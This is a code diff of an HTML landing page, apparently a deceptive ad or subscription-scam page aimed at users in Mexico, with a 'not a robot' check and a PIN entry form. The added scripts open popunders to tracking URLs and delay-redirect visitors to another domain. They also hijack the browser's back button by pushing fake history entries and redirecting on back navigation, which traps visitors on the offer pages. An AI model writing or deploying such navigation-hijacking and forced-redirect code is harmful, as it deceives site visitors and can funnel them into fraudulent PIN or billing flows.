@@ -8,26 +8,37 @@
         <link rel="shortcut icon" href="/public/images/action.ico">
         <script src="/public/javascript/jquery.min.js" charset="utf-8"></script>
         <script>
-            function launchpopLink() {
-                var redirectUrl = "https://ig2kv.bemobtrcks.com/click";
-                var mainUrl = "https://ig2kv.bemobtrcks.com/click";
-            
-                window.location.href = redirectUrl;
-                window.open(mainUrl, "_blank");
-            }
+            var offer_url = redirectUrl;
+            var split_url = "https://luckforyou.win/loading.html?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=popunder&c2=MX";
+        
+            function go() {
+                window.onbeforeunload = null;
+                window.open(offer_url);
+                setTimeout(function () {
+                    document.location.assign(split_url);
+                }, 1000);
+            };
         </script>
-            
         <script>
-            function init() {
-            setTimeout(function(){window.scrollTo(0,1)},0);
-            }
-            window.history.replaceState('/loading', '', '/loading');
-            window.history.pushState('/', '', '/');
-            window.addEventListener('popstate', function(e) {
-            if(document.URL.indexOf('/loading') >= 0){
-            document.location.href = document.location;
-            }
+            window.addEventListener("pageshow", function (event) {
+                (event.persisted || "back_forward" == performance.getEntriesByType("navigation")[0].type) && (window.location.href = "https://luckforyou.win/loading.html?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX")
             });
+        </script>
+        <script>
+        
+            var bbURL = "https://luckforyou.win/loading.html?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX";
+        
+            !function () {
+                var a;
+                try {
+                    for (a = 0; 3 > a; ++a) {
+                        history.pushState({}, "", "#")
+                    }
+                    onpopstate = function (c) {
+                        c.state && location.replace(bbURL)
+                    }
+                } catch (b) { }
+            }();
         </script>
         <script>
             function getURLParameter(name) {
@@ -94,6 +105,7 @@
                     verifyBtn: "Verificar PIN"
                 },
                 es: {
+                    a1: "Atenção!",
                     a2: "Asegúrate de que no eres un robot.",
                     errorMessage: "Ha ocurrido un error. Por favor, inténtalo de nuevo.",
                     successMessage: "¡Código de verificación enviado con éxito!",
@@ -974,8 +986,8 @@
                 <!-- 2、验证码输入框 + 发送验证码按钮 -->
                 <div class="form-group">                   
                     <div class="pin-input-container-pin">
-                        <input type="text" name="pin" id="pin" class="pin-input blink" placeholder="Enter 4-digit PIN" 
-                               pattern="[0-9]{4}" title="4-digit PIN" maxlength="4" disabled>
+                        <input type="text" name="pin" id="pin" class="pin-input blink" placeholder="Enter 6-digit PIN" 
+                               pattern="[0-9]{6}" title="6-digit PIN" maxlength="6" disabled>
                         <button type="submit" class="send-pin-btn" id="sendPinBtn">Send PIN</button>
                     </div>                       
                 </div>             
@@ -1108,7 +1120,7 @@
                 const fourplayerDiv = document.getElementById('fourplayer');
                
                 // 验证PIN码
-                if (!pinInput.value.match(/^\d{4}$/)) {
+                if (!pinInput.value.match(/^\d{6}$/)) {
                     errorDiv.style.display = 'block';
                     
                     return;
